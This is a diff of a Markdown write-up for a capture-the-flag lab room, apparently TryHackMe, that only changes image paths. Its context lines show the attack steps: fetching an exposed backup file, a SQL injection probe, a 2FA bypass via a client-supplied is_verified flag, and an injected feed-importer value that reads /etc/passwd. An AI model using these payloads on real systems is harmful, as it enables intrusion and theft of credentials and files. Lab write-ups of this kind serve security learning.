@@ -66,7 +66,7 @@ This confirmed the stack: Bootstrap 5, jQuery 3.6.3, and a custom `core.js` wort
 
 A second open listing was found at `/uploads/`, which later becomes relevant once the profile-picture upload feature is used:
 
-![Open directory listing of /uploads](assets/Uploads.png)
+![Open directory listing of /uploads](POC/Uploads.png)
 
 ---
 
@@ -80,7 +80,7 @@ Guessing at common backup extensions off `login.php` paid off immediately:
 curl http://10.48.187.93/login.php.bak
 ```
 
-![Curling the exposed .bak file](assets/FoungPassword.png)
+![Curling the exposed .bak file](POC/FoungPassword.png)
 
 The leaked source contained a developer comment left in from staging:
 
@@ -110,7 +110,7 @@ Takeaway: admin email `admin@mediahub.thm`, and a predictable password *pattern*
 
 Before brute-forcing, I checked whether the login endpoint was SQLi-vulnerable (classic `' OR '1'='1` on the email field, sent via a Burp Repeater tab):
 
-![Burp Repeater testing OR 1=1 injection on api_login.php](assets/ChanginClinedSideCode.png)
+![Burp Repeater testing OR 1=1 injection on api_login.php](POC/ChanginClinedSideCode.png)
 
 ```http
 PATCH /api_login.php HTTP/1.1
@@ -165,7 +165,7 @@ otp=123456
 
 The response body echoing back `is_verified:false` was the tell. In Burp Repeater, instead of submitting an `otp` value, I submitted the flag the server itself was echoing:
 
-![Burp Repeater sending is_verified=true directly to verify_otp.php](assets/Intersceptor.png)
+![Burp Repeater sending is_verified=true directly to verify_otp.php](POC/Intersceptor.png)
 
 ```http
 POST /verify_otp.php HTTP/1.1
@@ -187,7 +187,7 @@ The server trusted a client-supplied `is_verified` flag instead of independently
 
 This granted admin dashboard access, confirmed with an in-app flag banner for this stage of the room:
 
-![Admin dashboard reached after 2FA bypass, with the stage flag banner redacted](assets/Got_the_dashboard.png)
+![Admin dashboard reached after 2FA bypass, with the stage flag banner redacted](POC/Got_the_dashboard.png)
 
 > Flag for this stage (2FA bypass): `THM{█████████████████████}` (redacted)
 
@@ -233,7 +233,7 @@ Content-Type: application/x-www-form-urlencoded
 url=http://127.1; file:///etc/passwd
 ```
 
-![Response leaking /etc/passwd through the feed importer](assets/Fetched_etc_passwd.png)
+![Response leaking /etc/passwd through the feed importer](POC/Fetched_etc_passwd.png)
 
 ```
 root:x:0:0:root:/root:/bin/bash
@@ -257,7 +257,7 @@ Host: 10.48.187.93
 url=http://127.1; file:///var/www/user.txt
 ```
 
-![Final response containing the fully-redacted root flag](assets/ReadTheFile.png)
+![Final response containing the fully-redacted root flag](POC/ReadTheFile.png)
 
 ```
 THM{███████████████████████}   (redacted)
@@ -265,7 +265,7 @@ THM{███████████████████████}   (re
 
 Room completion confirmed:
 
-![Room completion / progress screen](assets/Pwned.png)
+![Room completion / progress screen](POC/Pwned.png)
 
 ---
 
